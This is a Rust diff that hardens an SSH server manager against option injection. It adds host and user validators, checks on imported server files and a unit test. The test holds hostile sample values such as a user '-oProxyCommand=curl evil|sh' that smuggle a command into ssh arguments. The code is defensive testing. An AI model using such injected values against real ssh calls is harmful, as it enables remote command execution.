@@ -255,10 +255,32 @@ impl ServerStore {
         // Jumps point at ids from the other machine; follow them to the new ids.
         let mut ids = std::collections::HashMap::new();
         for mut s in file.servers {
-            if s.accounts.is_empty() || s.host.trim().is_empty() || servers.iter().any(|x| x.name.eq_ignore_ascii_case(&s.name)) {
+            // The same checks as the editor (a file from elsewhere is not trusted):
+            // a user or host starting with '-' would reach ssh as an option.
+            let input = normalize(ServerInput {
+                id: None,
+                name: s.name.clone(),
+                host: s.host.clone(),
+                port: s.port,
+                group: s.group.clone(),
+                tags: s.tags.clone(),
+                note: s.note.clone(),
+                accounts: s.accounts.clone(),
+                jump: None,
+                pinned: Some(s.pinned),
+            });
+            let checked = validate(&input, &servers).and_then(|_| {
+                if added.iter().any(|x: &Server| x.name.eq_ignore_ascii_case(&input.name)) {
+                    Err(AppError::field("name_taken", "name"))
+                } else {
+                    Ok(())
+                }
+            });
+            if checked.is_err() {
                 skipped.push(s.name);
                 continue;
             }
+            (s.name, s.host, s.group, s.tags, s.note, s.accounts) = (input.name, input.host, input.group, input.tags, input.note, input.accounts);
             let new_id = uuid::Uuid::new_v4().to_string();
             ids.insert(std::mem::replace(&mut s.id, new_id), s.id.clone());
             s.created_at = now;
@@ -288,6 +310,10 @@ impl ServerStore {
 
         for h in hosts {
             let user = h.user.clone().unwrap_or_else(|| fallback_user.clone());
+            if !valid_host(&h.host_name) || !valid_user(&user) {
+                skipped.push(h.alias);
+                continue;
+            }
             let present = servers.iter().any(|s| {
                 s.name.eq_ignore_ascii_case(&h.alias)
                     || (s.host.eq_ignore_ascii_case(&h.host_name) && s.port == h.port && s.accounts.iter().any(|a| a.user == user))
@@ -376,6 +402,17 @@ fn normalize(mut input: ServerInput) -> ServerInput {
     input
 }
 
+/// A host name or address ssh can only read as a destination: no leading '-'
+/// (it would be taken as an option) and nothing a shell or ssh treats specially.
+pub(crate) fn valid_host(h: &str) -> bool {
+    !h.is_empty() && !h.starts_with('-') && h.len() <= 255 && h.chars().all(|c| c.is_ascii_alphanumeric() || ".-_:[]%".contains(c))
+}
+
+/// A login name: letters, digits and `._-@`, never starting with '-'.
+pub(crate) fn valid_user(u: &str) -> bool {
+    !u.is_empty() && !u.starts_with('-') && u.len() <= 64 && u.chars().all(|c| c.is_ascii_alphanumeric() || "._-@".contains(c))
+}
+
 fn validate(input: &ServerInput, servers: &[Server]) -> AppResult<()> {
     if input.name.is_empty() {
         return Err(AppError::field("required", "name"));
@@ -387,7 +424,7 @@ fn validate(input: &ServerInput, servers: &[Server]) -> AppResult<()> {
     if input.host.is_empty() {
         return Err(AppError::field("required", "host"));
     }
-    if input.host.contains(char::is_whitespace) {
+    if !valid_host(&input.host) {
         return Err(AppError::field("invalid_host", "host"));
     }
     if input.port == 0 {
@@ -416,11 +453,14 @@ fn validate(input: &ServerInput, servers: &[Server]) -> AppResult<()> {
         }
     }
     for (i, a) in input.accounts.iter().enumerate() {
+        if !valid_user(&a.user) {
+            return Err(AppError { code: "invalid_user", field: Some("accounts"), detail: Some(a.user.clone()) });
+        }
         if input.accounts[..i].iter().any(|b| b.user == a.user) {
             return Err(AppError { code: "duplicate_user", field: Some("accounts"), detail: Some(a.user.clone()) });
         }
         if let Auth::Key { path } = &a.auth {
-            if path.trim().is_empty() {
+            if path.trim().is_empty() || path.contains(['\n', '\r', '\0']) {
                 return Err(AppError::field("no_key", "accounts"));
             }
         }
@@ -613,6 +653,35 @@ mod tests {
         let (na, nb) = (&r.added[0], &r.added[1]);
         assert_eq!(nb.jump.as_ref().map(|j| j.server_id.clone()), Some(na.id.clone()));
         for p in [&store.path, &other.path, &file] {
+            fs::remove_file(p).ok();
+        }
+    }
+
+    #[test]
+    fn refuses_hosts_and_users_ssh_would_read_as_options() {
+        let store = temp_store("hostile");
+        let mut bad = input("evil", "-oProxyCommand=sh");
+        assert_eq!(store.save(bad.clone()).unwrap_err().code, "invalid_host");
+        bad.host = "10.0.0.1".into();
+        bad.accounts[0].user = "-oProxyCommand=curl evil|sh".into();
+        assert_eq!(store.save(bad).unwrap_err().code, "invalid_user");
+        assert!(valid_host("fe80::1%en0") && valid_host("[::1]") && valid_host("web-01.example.com"));
+        assert!(!valid_host("a b") && !valid_host("a;b") && !valid_host(""));
+        assert!(valid_user("deploy") && valid_user("svc.web-1") && !valid_user("a b") && !valid_user("-l"));
+
+        // An exported file with such entries imports nothing dangerous.
+        let file = store.path.with_extension("hostile.json");
+        let now = 0;
+        let server = |name: &str, host: &str, user: &str| Server {
+            id: name.into(), name: name.into(), host: host.into(), port: 22, group: String::new(), tags: vec![], note: String::new(),
+            accounts: vec![Account { user: user.into(), auth: Auth::Password }], jump: None, os: None, pinned: false,
+            watched_units: None, unit_names: Default::default(), created_at: now, updated_at: now,
+        };
+        let data = StoreFile { version: 1, servers: vec![server("a", "10.0.0.1", "-oProxyCommand=x"), server("b", "-oX", "root"), server("c", "10.0.0.2", "root")] };
+        fs::write(&file, serde_json::to_vec(&data).unwrap()).unwrap();
+        let r = store.import_file(&file).unwrap();
+        assert_eq!((r.added.len(), r.skipped.clone()), (1, vec!["a".to_string(), "b".to_string()]));
+        for p in [&store.path, &file] {
             fs::remove_file(p).ok();
         }
     }
